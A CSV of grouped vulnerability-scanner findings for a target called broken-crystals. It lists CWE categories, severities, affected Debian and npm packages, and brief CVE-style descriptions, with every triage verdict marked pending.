finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-120-096,trivy,broken-crystals,CWE-120,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-097,trivy,broken-crystals,CWE-120,critical,libpython2.7-minimal@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-098,trivy,broken-crystals,CWE-120,critical,libpython2.7-stdlib@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-099,trivy,broken-crystals,CWE-120,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-100,trivy,broken-crystals,CWE-120,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-101,trivy,broken-crystals,CWE-120,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-102,trivy,broken-crystals,CWE-120,high,linux-libc-dev@4.19.269-1,kernel: buffer overflow in drivers/net/ethernet/xilinx/ll_temac_main.c by sending heavy network traffic for about ten minutes,pending,low,no,1
GRP-broken-crystals-CWE-120-103,trivy,broken-crystals,CWE-120,critical,python2.7@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-104,trivy,broken-crystals,CWE-120,critical,python2.7-minimal@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-121-105,trivy,broken-crystals,CWE-121,high,libc-bin@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-106,trivy,broken-crystals,CWE-121,high,libc-dev-bin@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-107,trivy,broken-crystals,CWE-121,high,libc6@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-108,trivy,broken-crystals,CWE-121,high,libc6-dev@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-109,trivy,broken-crystals,CWE-121,medium,libde265-0@1.0.11-0+deb10u4,Buffer Overflow vulnerability in libde265 v1.0.12 allows a local attac ...,pending,low,no,1
GRP-broken-crystals-CWE-122-110,trivy,broken-crystals,CWE-122,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-111,trivy,broken-crystals,CWE-122,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-112,trivy,broken-crystals,CWE-122,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-113,trivy,broken-crystals,CWE-122,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-114,trivy,broken-crystals,CWE-122,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-115,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-116,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-117,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-118,trivy,broken-crystals,CWE-122,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-119,trivy,broken-crystals,CWE-122,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-120,trivy,broken-crystals,CWE-122,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-121,trivy,broken-crystals,CWE-122,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-122,trivy,broken-crystals,CWE-122,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-123,trivy,broken-crystals,CWE-122,low,libprocps7@2:3.3.15-2,procps: ps buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-124,trivy,broken-crystals,CWE-122,high,libsqlite3-0@3.27.2-3+deb10u2,sqlite: heap-buffer-overflow at sessionfuzz,pending,low,no,1
GRP-broken-crystals-CWE-122-125,trivy,broken-crystals,CWE-122,high,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: heap-buffer-overflow at sessionfuzz,pending,low,no,1
GRP-broken-crystals-CWE-122-126,trivy,broken-crystals,CWE-122,high,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-127,trivy,broken-crystals,CWE-122,high,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-128,trivy,broken-crystals,CWE-122,high,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-129,trivy,broken-crystals,CWE-122,high,libx11-6@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-130,trivy,broken-crystals,CWE-122,high,libx11-data@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-131,trivy,broken-crystals,CWE-122,high,libx11-dev@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-132,trivy,broken-crystals,CWE-122,low,procps@2:3.3.15-2,procps: ps buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-1240-133,npm-audit,broken-crystals,CWE-1240,low,elliptic,Elliptic Uses a Cryptographic Primitive with a Risky Implementation,pending,low,no,1
GRP-broken-crystals-CWE-1240-134,dep-check,broken-crystals,CWE-1240,low,elliptic:6.6.1,"The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs. This issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",pending,low,no,1
GRP-broken-crystals-CWE-1240-135,trivy,broken-crystals,CWE-1240,low,elliptic@6.5.4,elliptic: Key handling flaws in Elliptic,pending,low,no,1
GRP-broken-crystals-CWE-125-136,trivy,broken-crystals,CWE-125,high,comerr-dev@2.1-1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-137,trivy,broken-crystals,CWE-125,high,e2fsprogs@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-138,trivy,broken-crystals,CWE-125,high,libcom-err2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-139,trivy,broken-crystals,CWE-125,critical,libdb5.3@5.3.28+dfsg1-0.5,sqlite: heap out-of-bound read in function rtreenode(),pending,low,no,1
GRP-broken-crystals-CWE-125-140,trivy,broken-crystals,CWE-125,critical,libdb5.3-dev@5.3.28+dfsg1-0.5,sqlite: heap out-of-bound read in function rtreenode(),pending,low,no,1
GRP-broken-crystals-CWE-125-141,trivy,broken-crystals,CWE-125,high,libext2fs2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-142,trivy,broken-crystals,CWE-125,high,libheif1@1.3.2-2~deb10u1,An issue was discovered in heif::Box_iref::get_references in libheif 1 ...,pending,low,no,1
GRP-broken-crystals-CWE-125-143,trivy,broken-crystals,CWE-125,low,libsepol1@2.8-1,libsepol: heap-based buffer overflow in ebitmap_match_any(),pending,low,no,1
GRP-broken-crystals-CWE-125-144,trivy,broken-crystals,CWE-125,low,libsepol1-dev@2.8-1,libsepol: heap-based buffer overflow in ebitmap_match_any(),pending,low,no,1
GRP-broken-crystals-CWE-125-145,trivy,broken-crystals,CWE-125,high,libss2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-146,trivy,broken-crystals,CWE-125,high,libssh2-1@1.8.0-2.1,libssh2: integer overflow in kex_method_diffie_hellman_group_exchange_sha256_key_exchange in kex.c leads to out-of-bounds write,pending,low,no,1
GRP-broken-crystals-CWE-125-147,trivy,broken-crystals,CWE-125,high,linux-libc-dev@4.19.269-1,kernel: mounting a crafted f2fs filesystem image can lead to slab-out-of-bounds read access in f2fs_build_segment_manager in fs/f2fs/segment.c,pending,low,no,1
GRP-broken-crystals-CWE-1275-148,zap,broken-crystals,CWE-1275,low,http://host.docker.internal:3001,Cookie without SameSite Attribute,pending,low,no,1
